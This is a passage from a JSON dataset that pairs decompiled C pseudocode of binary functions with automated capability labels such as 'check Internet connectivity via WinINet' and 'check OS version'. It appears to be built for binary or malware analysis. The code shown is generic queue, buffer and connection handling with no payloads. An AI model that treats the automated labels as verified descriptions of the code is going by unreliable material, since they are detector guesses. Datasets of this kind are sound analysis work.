            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006d440(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_8h = fcn.000740b0(*(arg_8h + 4), &var_ch, 0);\n    if (var_8h == 0) {\n        var_4h = fcn.000356c0(0x14);\n        if (var_4h == NULL) {\n            fcn.00073fa0(&var_ch, 0);\n            var_8h = 0x21590004;\n        }\n        else {\n            *var_4h = 0;\n            var_4h[1] = 0;\n            var_4h[2] = 0;\n            var_4h[3] = 0;\n            var_4h[4] = 0;\n            var_4h[1] = var_ch;\n            var_4h[4] = *(arg_8h + 0x10);\n            fcn.000349b0(var_4h + 2);\n            *arg_ch = var_4h;\n            var_8h = 0;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 290
    },
    "0006d5c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006d5c0(int32_t arg_8h, int32_t *arg_ch, int32_t *arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(arg_8h + 0xc) == 0) {\n        if (*(arg_8h + 0x10) == 0) {\n            *arg_10h = 0;\n            var_4h = 4;\n            var_8h = fcn.00074610(*(arg_8h + 4), arg_10h, &var_4h, arg_14h, 1);\n            if (var_8h == 0) {\n                iVar1 = fcn.00035950(*arg_10h);\n                *arg_10h = iVar1;\n                if (*arg_10h < 0) {\n                    fcn.00073fa0(arg_8h + 4, 0);\n                    *(arg_8h + 0xc) = 1;\n                    var_8h = 0x2159000a;\n                }\n                else {\n                    iVar1 = fcn.000356c0(*arg_10h);\n                    *arg_ch = iVar1;\n                    if (*arg_ch == 0) {\n                        fcn.00073fa0(arg_8h + 4, 0);\n                        *(arg_8h + 0xc) = 1;\n                        var_8h = 0x21590004;\n                    }\n                    else if (*arg_10h != 0) {\n                        if ((arg_18h & 1) == 0) {\n                            var_8h = fcn.00074610(*(arg_8h + 4), *arg_ch, arg_10h, 60000, 1);\n                        }\n                        else {\n                            var_8h = fcn.00074610(*(arg_8h + 4), *arg_ch, arg_10h, arg_14h, 1);\n                        }\n                        if (var_8h != 0) {\n                            fcn.000357f0(*arg_ch);\n                            *arg_ch = 0;\n                            *(arg_8h + 0xc) = 1;\n                            fcn.00073fa0(arg_8h + 4, 0);\n                        }\n                    }\n                }\n            }\n        }\n        else {\n            *arg_10h = 0x800;\n            iVar1 = fcn.000356c0(*arg_10h);\n            *arg_ch = iVar1;\n            if (*arg_ch == 0) {\n                *arg_10h = 0;\n                var_8h = 0x21590004;\n            }\n            else {\n                var_8h = fcn.00074610(*(arg_8h + 4), *arg_ch, arg_10h, arg_14h, 0);\n                if (var_8h != 0) {\n                    fcn.000357f0(*arg_ch);\n                    *arg_ch = 0;\n                    *arg_10h = 0;\n                }\n            }\n        }\n    }\n    else {\n        var_8h = 0x21590065;\n    }\n    return var_8h;\n}\n",
        "token_count": 738
    },
    "0006d890": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006d890(int32_t arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(arg_8h + 0x10) == 0) {\n        var_14h = 0;\n        for (var_18h = arg_ch; var_18h != NULL; var_18h = *var_18h) {\n            var_14h = var_14h + var_18h[2];\n        }\n        var_14h = fcn.00035950(var_14h);\n        var_4h = 0;\n        var_ch = &var_14h;\n        var_8h = 4;\n        var_10h = arg_ch;\n        var_1ch = fcn.00074880(*(arg_8h + 4), &var_10h, arg_10h);\n    }\n    else {\n        var_1ch = fcn.00074880(*(arg_8h + 4), arg_ch, arg_10h);\n    }\n    return var_1ch;\n}\n",
        "token_count": 291
    },
    "0006d930": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006d930(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0006d890(arg_8h, arg_ch, 0);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0006d5c0(arg_8h, arg_10h, arg_14h, arg_18h, 0);\n    }\n    return iVar1;\n}\n",
        "token_count": 133
    },
    "0006d980": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006d980(int32_t *arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t var_54h;\n    uint var_50h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = fcn.000356c0(0xf8);\n    if (var_10h == 0) {\n        var_54h = 0x21590004;\n        goto code_r0x0006db0f;\n    }\n    fcn.00078bfa(var_10h, 0, 0xf8);\n    fcn.000349b0(var_10h + 0xd0);\n    fcn.000349b0(var_10h + 0xd8);\n    fcn.000344b0(var_10h + 0xd4);\n    var_8h = arg_ch;\n    var_4h = 0;\n    if (arg_18h == 0) {\n        if (arg_10h == 0) {\n            var_54h = 0x21590064;\n            goto code_r0x0006db0f;\n        }\n        var_54h = fcn.00074a40(var_10h + 8, &var_8h, arg_10h, arg_14h, arg_20h);\n        if (var_54h != 0) goto code_r0x0006db0f;\n        *(var_10h + 0xc) = *(var_10h + 8);\n    }\n    else {\n        var_54h = fcn.00074a70(var_10h + 4, &var_8h, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (var_54h != 0) goto code_r0x0006db0f;\n        *(var_10h + 0xc) = *(var_10h + 4);\n    }\n    if ((arg_10h != 0) && (arg_18h == 0)) {\n        fcn.00078ad4(&var_50h, 0x800558f0, 0x9fff6, 0);\n        fcn.00074ed0(*(var_10h + 0xc), &var_50h, 0);\n        for (var_ch = 0; var_ch < 10; var_ch = var_ch + 1) {\n            fcn.0006e090(var_10h);\n        }\n        fcn.0001ace0(var_10h + 0x10, 0x800ae450, var_10h);\n    }\n    *(var_10h + 0xe8) = 1;\n    *arg_8h = var_10h;\ncode_r0x0006db0f:\n    if ((var_54h != 0) && (var_10h != 0)) {\n        if (*(var_10h + 0xc) != 0) {\n            fcn.00074dc0(var_10h + 0xc, 0);\n        }\n        fcn.00034540(var_10h + 0xd4);\n        fcn.000349e0(var_10h + 0xd0);\n        fcn.000349e0(var_10h + 0xd8);\n        fcn.000357f0(var_10h);\n    }\n    return var_54h;\n}\n",
        "token_count": 824
    },
    "0006db80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006db80(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00034a10(arg_8h + 0xd0);\n    for (var_4h = *(arg_8h + 0xc4); var_4h != 0; var_4h = *(var_4h + 0xb8)) {\n        fcn.00034a10(var_4h + 0xd0);\n        *(var_4h + 0xb4) = 0x21590006;\n        fcn.00034a80(var_4h + 0xd0);\n    }\n    fcn.00034a80(arg_8h + 0xd0);\n    *(arg_8h + 0xb4) = 0x21590006;\n    fcn.00034570(arg_8h + 0xd4);\n    if (*(arg_8h + 0xa8) != 0) {\n        fcn.00034a10(arg_8h + 0xd0);\n        var_ch = *(arg_8h + 0xa8);\n        while (var_ch != NULL) {\n            puVar1 = *var_ch;\n            fcn.000752c0(*(arg_8h + 0xc), var_ch[1]);\n            fcn.000357f0(var_ch);\n            var_ch = puVar1;\n        }\n        *(arg_8h + 0xa8) = 0;\n        *(arg_8h + 0xac) = 0;\n        fcn.00034a80(arg_8h + 0xd0);\n    }\n    if (*(arg_8h + 0xe8) != 0) {\n        fcn.00074dc0(arg_8h + 0xc, 0);\n    }\n    iVar2 = fcn.00037730(arg_8h + 0x10);\n    if (iVar2 != 0) {\n        fcn.00037760(arg_8h + 0x10, 0);\n    }\n    return;\n}\n",
        "token_count": 492
    },
    "0006dcd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006dcd0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    while( true ) {\n        while (iVar1 = fcn.00034a30(arg_8h + 0xd0),  iVar1 == 0) {\n            fcn.00043cb0(1);\n        }\n        if (*(arg_8h + 0xc0) == 0) break;\n        iVar1 = fcn.00034a30(*(arg_8h + 0xc0) + 0xd0);\n        if (iVar1 != 0) goto code_r0x0006dd43;\n        fcn.00034a80(arg_8h + 0xd0);\n        fcn.00043cb0(1);\n    }\n    fcn.00034a80(arg_8h + 0xd0);\ncode_r0x0006dd43:\n    if (*(arg_8h + 0xc0) != 0) {\n        if (*(arg_8h + 0xb8) == 0) {\n            *(*(arg_8h + 0xc0) + 200) = *(arg_8h + 0xbc);\n        }\n        else {\n            *(*(arg_8h + 0xb8) + 0xbc) = *(arg_8h + 0xbc);\n        }\n        if (*(arg_8h + 0xbc) == 0) {\n            *(*(arg_8h + 0xc0) + 0xc4) = *(arg_8h + 0xb8);\n        }\n        else {\n            *(*(arg_8h + 0xbc) + 0xb8) = *(arg_8h + 0xb8);\n        }\n        fcn.00034a80(*(arg_8h + 0xc0) + 0xd0);\n        fcn.00034a80(arg_8h + 0xd0);\n    }\n    if (*(arg_8h + 0xc4) != 0) {\n        fcn.00034a10(arg_8h + 0xd0);\n        iVar1 = *(arg_8h + 0xc4);\n        while (var_4h = iVar1,  var_4h != 0) {\n            iVar1 = *(var_4h + 0xb8);\n            if ((*(var_4h + 0xe4) != 0) || (*(var_4h + 0xe0) != 0)) {\n                fcn.0006dcd0(var_4h);\n            }\n        }\n        *(arg_8h + 0xcc) = 0;\n        for (var_4h = *(arg_8h + 0xc4); var_4h != 0; var_4h = *(var_4h + 0xb8)) {\n            fcn.00034a10(var_4h + 0xd0);\n            *(var_4h + 0xc0) = 0;\n            *(var_4h + 0xbc) = 0;\n            *(var_4h + 0xb8) = 0;\n            fcn.00034a80(var_4h + 0xd0);\n        }\n        *(arg_8h + 200) = 0;\n        *(arg_8h + 0xc4) = 0;\n        fcn.00034a80(arg_8h + 0xd0);\n    }\n    fcn.00034540(arg_8h + 0xd4);\n    fcn.000349e0(arg_8h + 0xd0);\n    fcn.000349e0(arg_8h + 0xd8);\n    iVar1 = fcn.00037730(arg_8h + 0x10);\n    if (iVar1 != 0) {\n        fcn.00037710(arg_8h + 0x10);\n    }\n    fcn.000357f0(arg_8h);\n    return;\n}\n",
        "token_count": 902
    },
    "0006df60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006df60(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t var_4h;\n    \n    if (*(arg_8h + 0xb4) == 0) {\n        fcn.00034a10(arg_8h + 0xd0);\n        if ((*(arg_8h + 0xcc) == 0) && (fcn.0006e090(arg_8h),  *(arg_8h + 0xcc) == 0)) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            while( true ) {\n                for (var_4h = *(arg_8h + 0xc4); (var_4h != 0 && (*(var_4h + 0xe0) == 0)); var_4h = *(var_4h + 0xb8)) {\n                }\n                if (var_4h != 0) {\n                    *(var_4h + 0xe0) = 0;\n                    *arg_ch = var_4h;\n                    fcn.0006e090(arg_8h);\n                    if (*(arg_8h + 0xcc) < 10) {\n                        fcn.0006e090(arg_8h);\n                    }\n                    fcn.00034a80(arg_8h + 0xd0);\n                    return 0;\n                }\n                fcn.00034a80(arg_8h + 0xd0);\n                fcn.000345a0(arg_8h + 0xd4, 0xffffffff);\n                if (*(arg_8h + 0xb4) != 0) break;\n                fcn.00034a10(arg_8h + 0xd0);\n            }\n            uVar1 = *(arg_8h + 0xb4);\n        }\n    }\n    else {\n        uVar1 = *(arg_8h + 0xb4);\n    }\n    return uVar1;\n}\n",
        "token_count": 445
    },
    "0006e090": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006e090(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.000356c0(0xf8);\n    if (iVar1 == 0) {\n        uVar2 = 0x21590004;\n    }\n    else {\n        fcn.00078bfa(iVar1, 0, 0xf8);\n        fcn.000349b0(iVar1 + 0xd0);\n        fcn.000349b0(iVar1 + 0xd8);\n        fcn.000344b0(iVar1 + 0xd4);\n        *(iVar1 + 8) = *(arg_8h + 8);\n        *(iVar1 + 0xc) = *(arg_8h + 0xc);\n        *(iVar1 + 0xe4) = 1;\n        fcn.00034a10(arg_8h + 0xd0);\n        *(iVar1 + 0xbc) = *(arg_8h + 200);\n        if (*(arg_8h + 200) != 0) {\n            *(*(arg_8h + 200) + 0xb8) = iVar1;\n        }\n        *(arg_8h + 200) = iVar1;\n        if (*(arg_8h + 0xc4) == 0) {\n            *(arg_8h + 0xc4) = *(arg_8h + 200);\n        }\n        *(arg_8h + 0xcc) = *(arg_8h + 0xcc) + 1;\n        *(iVar1 + 0xc0) = arg_8h;\n        fcn.00034a80(arg_8h + 0xd0);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 416
    },
    "0006e200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006e200(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    if (*(arg_8h + 4) == 0) {\n        var_4h = fcn.00075640(*(arg_8h + 8), arg_ch, arg_10h, arg_8h + 0x18, 0);\n    }\n    else {\n        var_4h = fcn.00075340(*(arg_8h + 4), arg_ch, arg_10h, 0);\n    }\n    return var_4h;\n}\n",
        "token_count": 143
    },
    "0006e260": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006e260(int32_t arg_8h, uint *arg_ch, uint *arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(arg_8h + 0xb4) == 0) {\n        if (*(arg_8h + 4) == 0) {\n            fcn.00034a10(arg_8h + 0xd8);\n            if (*(arg_8h + 0xb4) == 0) {\n                var_ch = 0x21590002;\n                for (var_4h = 0; var_4h < 2; var_4h = var_4h + 1) {\n                    fcn.00034a10(arg_8h + 0xd0);\n                    if (*(arg_8h + 0xa8) != 0) {\n                        *arg_ch = *(*(arg_8h + 0xa8) + 4);\n                        *arg_10h = *(*(arg_8h + 0xa8) + 8);\n                        *(arg_8h + 0xb0) = *(arg_8h + 0xb0) - *(*(arg_8h + 0xa8) + 8);\n                        iVar1 = **(arg_8h + 0xa8);\n                        fcn.000357f0(*(arg_8h + 0xa8));\n                        *(arg_8h + 0xa8) = iVar1;\n                        if (iVar1 == 0) {\n                            *(arg_8h + 0xac) = 0;\n                        }\n                        fcn.00034a80(arg_8h + 0xd0);\n                        var_ch = 0;\n                        break;\n                    }\n                    if (*(arg_8h + 0xb4) != 0) {\n                        var_ch = *(arg_8h + 0xb4);\n                        fcn.00034a80(arg_8h + 0xd0);\n                        break;\n                    }\n                    fcn.00034a80(arg_8h + 0xd0);\n                    if (arg_14h == 0) break;\n                    iVar1 = fcn.000345a0(arg_8h + 0xd4, 0);\n                    if (iVar1 == 0) {\n                        fcn.000345a0(arg_8h + 0xd4, arg_14h);\n                    }\n                    else {\n                        var_4h = var_4h + -1;\n                    }\n                }\n                fcn.00034a80(arg_8h + 0xd8);\n            }\n            else {\n                fcn.00034a80(arg_8h + 0xd8);\n                var_ch = *(arg_8h + 0xb4);\n            }\n        }\n        else {\n            var_ch = fcn.00075400(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_18h);\n        }\n    }\n    else {\n        var_ch = *(arg_8h + 0xb4);\n    }\n    return var_ch;\n}\n",
        "token_count": 715
    },
    "0006e450": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006e450(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_d0h;\n    int32_t var_cch;\n    int32_t var_c8h;\n    int32_t *var_c4h;\n    int32_t *var_c0h;\n    uint32_t var_bch;\n    uint var_b8h;\n    uint *var_b4h;\n    uint var_b0h;\n    uint *var_ach;\n    int32_t var_a8h;\n    uint *var_a4h;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = arg_8h;\ncode_r0x0006e461:\n    do {\n        var_a8h = fcn.00075850(*(var_4h + 8), &var_a0h, &var_9ch, &var_98h, 0xffffffff, 0);\n        if (var_a8h != 0) {\n            *(var_4h + 0xb4) = var_a8h;\n            fcn.00034a10(var_4h + 0xd0);\n            for (var_8h = *(var_4h + 0xc4); var_8h != 0; var_8h = *(var_8h + 0xb8)) {\n                fcn.00034a10(var_8h + 0xd0);\n                *(var_8h + 0xb4) = var_a8h;\n                fcn.00034570(var_8h + 0xd4);\n                fcn.00034a80(var_8h + 0xd0);\n            }\n            fcn.00034a80(var_4h + 0xd0);\n            return 0;\n        }\n        fcn.00034a10(var_4h + 0xd0);\n        for (var_8h = *(var_4h + 0xc4); var_8h != 0; var_8h = *(var_8h + 0xb8)) {\n            if (*(var_8h + 0xe4) == 0) {\n                var_c0h = var_8h + 0x18;\n                var_c4h = &var_98h;\n                for (var_bch = 0x90; 3 < var_bch; var_bch = var_bch - 4) {\n                    if (*var_c4h != *var_c0h) goto code_r0x0006e53d;\n                    var_c0h = var_c0h + 1;\n                    var_c4h = var_c4h + 1;\n                }\n                if (var_bch == 0) {\ncode_r0x0006e613:\n                    var_cch = 0;\n                }\n                else {\ncode_r0x0006e53d:\n                    var_c8h = *var_c4h - *var_c0h;\n                    if (var_c8h == 0) {\n                        if (var_bch == 1) goto code_r0x0006e613;\n                        var_c8h = *(var_c4h + 1) - *(var_c0h + 1);\n                        if (var_c8h == 0) {\n                            if (var_bch == 2) goto code_r0x0006e613;\n                            var_c8h = *(var_c4h + 2) - *(var_c0h + 2);\n                            if (var_c8h == 0) {\n                                if ((var_bch == 3) || (var_c8h = *(var_c4h + 3) - *(var_c0h + 3),  var_c8h == 0))\n                                goto code_r0x0006e613;\n                            }\n                        }\n                    }\n                    var_cch = 1;\n                    if (var_c8h < 1) {\n                        var_cch = -1;\n                    }\n                }\n                if (var_cch == 0) break;\n            }\n        }\n        if (var_8h != 0) {\ncode_r0x0006e793:\n            if (var_8h == 0) {\n                fcn.000752c0(*(var_4h + 0xc), var_a0h);\n                if (*(var_4h + 0xf4) != 0) {\n                    var_b8h = *(var_4h + 8);\n                    var_b4h = &var_98h;\n                    (**(var_4h + 0xf4))(*(var_4h + 0xec), var_a0h, var_9ch, 0x800aebc0, &var_b8h);\n                }\n            }\n            else {\n                fcn.00034a10(var_8h + 0xd0);\n                if (*(var_8h + 0xb4) != 0) {\n                    fcn.00034a80(var_8h + 0xd0);\n                    fcn.00034a80(var_4h + 0xd0);\n                    fcn.000752c0(*(var_4h + 0xc), var_a0h);\n                    goto code_r0x0006e461;\n                }\n                if (*(var_8h + 0xb0) + var_9ch < 0x100000) {\n                    var_a4h = fcn.000356c0(0x10);\n                    if (var_a4h == NULL) {\n                        fcn.000752c0(*(var_4h + 0xc), var_a0h);\n                    }\n                    else {\n                        *var_a4h = 0;\n                        var_a4h[1] = 0;\n                        var_a4h[2] = 0;\n                        var_a4h[3] = 0;\n                        var_a4h[1] = var_a0h;\n                        var_a4h[2] = var_9ch;\n                        if (*(var_8h + 0xac) == 0) {\n                            *(var_8h + 0xa8) = var_a4h;\n                        }\n                        else {\n                            **(var_8h + 0xac) = var_a4h;\n                        }\n                        *(var_8h + 0xac) = var_a4h;\n                        *(var_8h + 0xb0) = *(var_8h + 0xb0) + var_9ch;\n                        fcn.00034570(var_8h + 0xd4);\n                    }\n                }\n                else {\n                    fcn.000752c0(*(var_4h + 0xc), var_a0h);\n                }\n                fcn.00034a80(var_8h + 0xd0);\n            }\n            fcn.00034a80(var_4h + 0xd0);\n            goto code_r0x0006e461;\n        }\n        if ((*(var_4h + 0xf0) == 0) || (iVar1 = (**(var_4h + 0xf0))(*(var_4h + 0xec), var_a0h, var_9ch),  iVar1 != 0)) {\n            var_8h = *(var_4h + 0xc4);\ncode_r0x0006e72d:\n            if (var_8h != 0) {\n                if (*(var_8h + 0xe4) == 0) break;\n                puVar2 = &var_98h;\n                puVar3 = var_8h + 0x18;\n                for (iVar1 = 0x24; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar3 = *puVar2;\n                    puVar2 = puVar2 + 1;\n                    puVar3 = puVar3 + 1;\n                }\n                *(var_8h + 0xe4) = 0;\n                *(var_8h + 0xe0) = 1;\n                *(var_4h + 0xcc) = *(var_4h + 0xcc) + -1;\n                fcn.00034570(var_4h + 0xd4);\n            }\n            goto code_r0x0006e793;\n        }\n        fcn.00034a80(var_4h + 0xd0);\n        if (*(var_4h + 0xf4) != 0) {\n            var_b0h = *(var_4h + 8);\n            var_ach = &var_98h;\n            (**(var_4h + 0xf4))(*(var_4h + 0xec), var_a0h, var_9ch, 0x800aebc0, &var_b0h);\n        }\n        fcn.000752c0(*(var_4h + 0xc), var_a0h);\n    } while( true );\n    var_8h = *(var_8h + 0xb8);\n    goto code_r0x0006e72d;\n}\n",
        "token_count": 2031
    },
    "0006ea00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006ea00(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0006e200(arg_8h, arg_ch, arg_10h);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0006e260(arg_8h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    }\n    return iVar1;\n}\n",
        "token_count": 147
    },
    "0006eb30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0006eb30(int32_t arg_8h, uint arg_ch)\n\n{\n    uint var_4h;\n    \n    if (*(arg_8h + 4) == 0) {\n        var_4h = fcn.00075710(*(arg_8h + 8), arg_ch, arg_8h + 0x18, 0);\n    }\n    else {\n        var_4h = fcn.00075510(*(arg_8h + 4), arg_ch, 0);\n    }\n    return var_4h;\n}\n",
        "token_count": 127
    },
    "0006eb80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006eb80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.0006eb30(arg_8h, arg_ch);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0006e260(arg_8h, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    return iVar1;\n}\n",
        "token_count": 136
    },
    "0006ec00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0006ec00(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000356c0(0x40);\n    if (var_4h == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078bfa(var_4h, 0, 0x40);\n        *(var_4h + 0xc) = *0x800b923c;\n        *(var_4h + 0x10) = *0x800b9240;\n        *(var_4h + 0x14) = *0x800b9244;\n        *(var_4h + 0x18) = *0x800b9248;\n        fcn.000349b0(var_4h + 0x28);\n        var_ch = arg_ch;\n        var_8h = 0;\n        iVar1 = fcn.00075eb0(var_4h + 4, &var_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n        if (iVar1 == 0) {\n            *arg_8h = var_4h;\n        }\n        else {\n            fcn.000357f0(var_4h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 375
    },
    "0006ed10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0006ed10(int32_t arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = fcn.000762e0(*(arg_8h + 4), &var_4h, arg_10h);\n    if (var_8h == 0) {\n        iVar1 = fcn.000356c0(0x40);\n        *arg_ch = iVar1;\n        if (*arg_ch == 0) {\n            var_8h = 0x21590004;\n        }\n        else {\n            fcn.00078bfa(*arg_ch, 0, 0x40);\n            *(*arg_ch + 4) = var_4h;\n            *(*arg_ch + 8) = 2;\n            iVar1 = *arg_ch;\n            *(iVar1 + 0xc) = *(arg_8h + 0xc);\n            *(iVar1 + 0x10) = *(arg_8h + 0x10);\n            *(iVar1 + 0x14) = *(arg_8h + 0x14);\n            *(iVar1 + 0x18) = *(arg_8h + 0x18);\n            *(*arg_ch + 0x2c) = *(arg_8h + 0x2c);\n            fcn.000349b0(*arg_ch + 0x28);\n        }\n        if (var_8h != 0) {\n            fcn.000761d0(arg_ch, 0);\n            *arg_ch = 0;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 394
    },
    "0006eee0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
